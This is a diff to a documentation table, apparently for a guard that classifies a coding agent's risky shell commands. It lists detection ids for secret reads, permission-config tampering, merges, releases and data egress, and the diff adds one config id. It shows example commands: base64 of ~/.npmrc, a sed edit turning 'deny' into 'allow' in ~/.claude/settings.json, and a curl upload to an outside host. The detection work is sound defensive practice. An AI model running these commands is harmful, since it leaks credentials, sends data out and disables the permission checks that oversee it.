@@ -139,7 +139,7 @@ Every id has a test fixture.
 | Family | Action | Spellings | Example |
 |---|---|---|---|
 | secret | `secret-read` | `read.secret`, `read.secret-symlink`, `grep.secret`, and 22 `bash.secret.*` ids: `cat`, `head-tail-less`, `grep`, `cp-mv`, `encode`, `redirect-in`, `here-string`, `subshell`, `absolute`, `home-relative`, `symlink`, `link-then-read`, `var-indirection`, `quoting`, `glob`, `sh-c`, `xargs`, `inline-interpreter`, `heredoc-shell`, `script-by-path`, `keychain`, `mention` | `base64 < ~/.npmrc` |
-| config | `authority-config` | `write.config`, and `bash.config.*`: `redirect-out`, `tee`, `cp-mv-ln`, `in-place`, `remove`, `interpreter`, `git-hooks`, `git-config-hookspath`, `claude-cli`, `mention` | `sed -i '' 's/deny/allow/' ~/.claude/settings.json` |
+| config | `authority-config` | `write.config`, and `bash.config.*`: `redirect-out`, `tee`, `cp-mv-ln`, `in-place`, `remove`, `interpreter`, `git-hooks`, `git-config-hookspath`, `claude-cli`, `console-owner-auth`, `mention` | `sed -i '' 's/deny/allow/' ~/.claude/settings.json` |
 | merge | `merge` | `bash.merge.*`: `gh-pr-merge`, `gh-api-merge`, `gh-api-merges`, `gh-api-graphql`, `curl-api`, `git-merge-protected`, `git-push-protected`, `git-push-implicit`, `git-push-all` | `gh pr merge 12 --squash` |
 | release | `release` | `bash.release.*`: `npm-publish`, `pnpm-publish`, `yarn-bun-publish`, `changeset-publish`, `npm-registry-mutation`, `gh-release`, `gh-workflow-run`, `wrangler-deploy`, `version-packages-merge` | `pnpm exec changeset publish` |
 | egress | `private-egress` | `bash.egress.*`: `gh-gist`, `curl-upload`, `wget-upload`, `httpie`, `raw-socket`, `remote-copy`, `cloud-copy`, `git-push-url` | `curl -d @report.json https://collect.example.com/in` |
